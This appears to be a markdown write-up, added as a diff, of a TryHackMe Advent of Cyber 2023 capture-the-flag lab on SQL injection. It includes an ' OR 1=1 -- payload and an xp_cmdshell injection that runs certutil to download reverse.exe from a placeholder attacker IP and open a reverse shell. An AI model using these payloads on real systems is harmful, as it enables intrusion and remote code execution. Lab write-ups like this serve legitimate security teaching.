@@ -1,0 +1,57 @@
+<img src="Media/Advent_day_1/img_1.jpg" height=100% width=100% >
+<h1>🎅🏻Ho! 🎅🏻Ho! 🎅🏻Ho! 
+Welcome to Advent of Cyber 2023</h1>
+
+<h2>[Day 10] SQL injection Inject the Halls with EXEC Queries</h2>
+
+Let us have some fun with SQL Injections!!!
+
+Today  we have to start both the VM and AttackBox.
+
+## Question 1: Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?
+
+Not so difficult to find... Just type the address you see on your web browser!
+
+## Question 2: Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?
+
+If you follow the that you can find in Testing SQL Injections you can find it with red letters in the middle of the screen...
+
+<img src="Media/Advent_day_10/img_1.jpg" height=50% width=50% >
+
+## Question 3: Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?
+
+Now again following the same instructions of typing `' OR 1=1 --` after the `http://10.10.24.114/giftresults.php?age=` you can find the answer at the end of a long list you get as response.
+
+<img src="Media/Advent_day_10/img_2.jpg" height=50% width=50% >
+
+## Question 4: What flag is in the note file Gr33dstr left behind on the system?
+
+Now you will have to follow the instructions in the `Remote Code Execution` section. If you are not aware what is happening you can find more about it by searching for Metasploit in the Search function of TryHackMe.
+
+By the way when you start the Terminal you can also find the IP of the AttackBox. You just need to check the ip after `root@ip.....` just change the dashes `-` between the numbers with dots `.`.
+
+<img src="Media/Advent_day_10/img_3.jpg" height=50% width=50% >
+
+Now you need to start the python server.
+
+And send a new request through your web browser. Keep in mind you should use your AttackBox IP
+`http://10.10.24.114/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --`
+
+<img src="Media/Advent_day_10/img_4.jpg" height=50% width=50% >
+
+Follow the next 2 commands and now you will be able to give commands in the Windows Server
+
+<img src="Media/Advent_day_10/img_5.jpg" height=50% width=50% >
+
+Now you should navigate to `C:\Users\Administrator\Desktop>` and you can find the answer
+
+<img src="Media/Advent_day_10/img_6.jpg" height=50% width=50% >
+
+## Question 5: What is the flag you receive on the homepage after restoring the website?
+
+Just type the command Gr33dstr left in the instructions and then open again the website from your browser!
+
+<img src="Media/Advent_day_10/img_7.jpg" height=50% width=50% >
+
+
+# Until the next time! 🎅🏿🎅🏿🎅🏿
